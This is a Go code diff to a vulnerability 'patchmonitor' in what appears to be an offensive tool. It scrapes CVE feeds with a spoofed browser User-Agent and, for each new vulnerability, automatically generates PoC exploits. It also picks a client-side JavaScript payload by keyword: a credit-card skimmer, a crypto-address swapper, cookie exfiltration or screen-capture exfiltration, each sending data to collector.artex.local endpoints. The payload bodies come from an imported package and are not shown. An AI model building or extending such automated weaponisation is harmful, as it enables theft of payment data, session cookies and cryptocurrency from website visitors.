@@ -6,55 +6,133 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net/http"
+	"strings"
+
+	"github.com/Autumn-27/artex/agent/payloads"
 )
 
-// checkSource fetches and processes a single source.
-func (m *Monitor) checkSource(src PatchSource) {
-	log.Printf("[patchmonitor] Checking: %s", src.Name)
+// checkSource fetches and processes a single source, and when AutoGenerate is enabled,
+// automatically generates PoC exploits and client-side payloads for discovered vulnerabilities.
+func (m *Monitor) checkSource(src PatchSource) []Vulnerability {
+	log.Printf("[patchmonitor] Checking: %s (%s)", src.Name, src.URL)
 
-	resp, err := m.httpClient.Get(src.URL)
+	req, err := http.NewRequest(http.MethodGet, src.URL, nil)
+	if err != nil {
+		m.updateSourceStatus(src.ID, "error", fmt.Sprintf("request error: %v", err))
+		return nil
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+	req.Header.Set("Accept", "application/json, application/xml, text/xml, application/atom+xml, text/html, */*")
+
+	resp, err := m.httpClient.Do(req)
 	if err != nil {
 		m.updateSourceStatus(src.ID, "error", fmt.Sprintf("fetch error: %v", err))
-		return
+		return nil
 	}
 	defer resp.Body.Close()
 
-	body, err := io.ReadAll(resp.Body)
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 5*1024*1024))
 	if err != nil {
 		m.updateSourceStatus(src.ID, "error", fmt.Sprintf("read error: %v", err))
-		return
+		return nil
 	}
 
 	hash := sha256.Sum256(body)
 	hashStr := hex.EncodeToString(hash[:])
 
-	if hashStr == src.LastHash {
-		m.updateSourceStatus(src.ID, "success", "no changes")
-		return
-	}
+	vulns := m.parseContent(src.SourceType, src.Name, body)
+	var added []Vulnerability
+	gen := NewExploitGenerator(m.db)
 
-	vulns := m.parseContent(src.SourceType, body)
-	newCount := 0
 	for _, v := range vulns {
-		if err := m.storeVulnerability(src.ID, v); err == nil {
-			newCount++
+		v.SourceName = src.Name
+		vulnID, inserted := m.storeVulnerabilityReturningID(src.ID, v)
+		if inserted && vulnID > 0 {
+			v.ID = vulnID
+			added = append(added, v)
+			if m.AutoPayloadEnabled() {
+				m.autoGenerateExploitAndPayload(gen, v)
+			}
 		}
 	}
 
-	m.updateSourceHash(src.ID, hashStr, "success", fmt.Sprintf("%d new", newCount))
-	log.Printf("[patchmonitor] %s: %d new vulns", src.Name, newCount)
+	m.updateSourceHash(src.ID, hashStr, "success", fmt.Sprintf("%d parsed, %d new", len(vulns), len(added)))
+	log.Printf("[patchmonitor] %s: %d parsed, %d new vulns", src.Name, len(vulns), len(added))
+	return added
+}
+
+// autoGenerateExploitAndPayload automatically invokes both the ExploitGenerator and the
+// Client-Side Payload Generator for a newly discovered vulnerability.
+func (m *Monitor) autoGenerateExploitAndPayload(gen *ExploitGenerator, v Vulnerability) {
+	if gen == nil {
+		return
+	}
+	// 1. Generate PoC Exploit
+	_, _ = gen.GenerateExploitsForVuln(v.ID)
+
+	// 2. Automatically generate matching client-side payload based on vulnerability context
+	combined := strings.ToLower(v.Title + " " + v.Description + " " + v.AffectedVersions)
+	var payloadCode, payloadType string
+
+	switch {
+	case strings.Contains(combined, "payment") || strings.Contains(combined, "checkout") || strings.Contains(combined, "commerce") || strings.Contains(combined, "cart") || strings.Contains(combined, "magento") || strings.Contains(combined, "shopify"):
+		payloadType = "cc_skimmer"
+		payloadCode, _ = payloads.GenerateCCSkimmer(payloads.CCSkimmerConfig{
+			ExfilEndpoint:    "https://collector.artex.local/exfil/cc",
+			MaskOriginalForm: true,
+		})
+	case strings.Contains(combined, "crypto") || strings.Contains(combined, "wallet") || strings.Contains(combined, "web3") || strings.Contains(combined, "clipboard"):
+		payloadType = "crypto_swap_dom"
+		payloadCode, _ = payloads.GenerateCryptoSwapDOM(payloads.CryptoSwapConfig{
+			ReplacementAddr: "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0",
+		})
+	case strings.Contains(combined, "xss") || strings.Contains(combined, "session") || strings.Contains(combined, "auth") || strings.Contains(combined, "cookie") || strings.Contains(combined, "token") || strings.Contains(combined, "browser") || strings.Contains(combined, "chrome") || strings.Contains(combined, "webkit") || strings.Contains(combined, "safari"):
+		payloadType = "cookie_exfil"
+		payloadCode, _ = payloads.GenerateCookieExfil(payloads.CookieExfilConfig{
+			ExfilEndpoint: "https://collector.artex.local/exfil/cookies",
+			ExfilMethod:   "beacon",
+		})
+	default:
+		payloadType = "screen_exfil"
+		payloadCode, _ = payloads.GenerateScreenExfil(payloads.ScreenExfilConfig{
+			ExfilEndpoint: "https://collector.artex.local/exfil/screen",
+			Quality:       75,
+		})
+	}
+
+	if payloadCode != "" {
+		_, _ = gen.persistExploit(GeneratedExploit{
+			VulnID:      v.ID,
+			CVEID:       v.CVEID,
+			ExploitType: "payload:" + payloadType,
+			Code:        payloadCode,
+			Language:    "javascript",
+			Confidence:  0.85,
+			Status:      "auto_generated",
+		})
+	}
 }
 
 // parseContent dispatches to appropriate parser based on source type.
-func (m *Monitor) parseContent(sourceType string, body []byte) []Vulnerability {
+func (m *Monitor) parseContent(sourceType, sourceName string, body []byte) []Vulnerability {
 	switch sourceType {
 	case "nvd":
 		return parseNVD(body)
+	case "cisa_kev":
+		return parseCISAKEV(body)
+	case "msrc":
+		return parseMSRC(body)
+	case "redhat":
+		return parseRedHat(body)
 	case "github":
 		return parseGitHub(body)
 	case "exploitdb":
 		return parseExploitDB(body)
+	case "rss", "atom", "apple":
+		return parseRSSOrHTML(body, sourceName)
 	default:
 		return parseGeneric(body)
 	}
 }
+
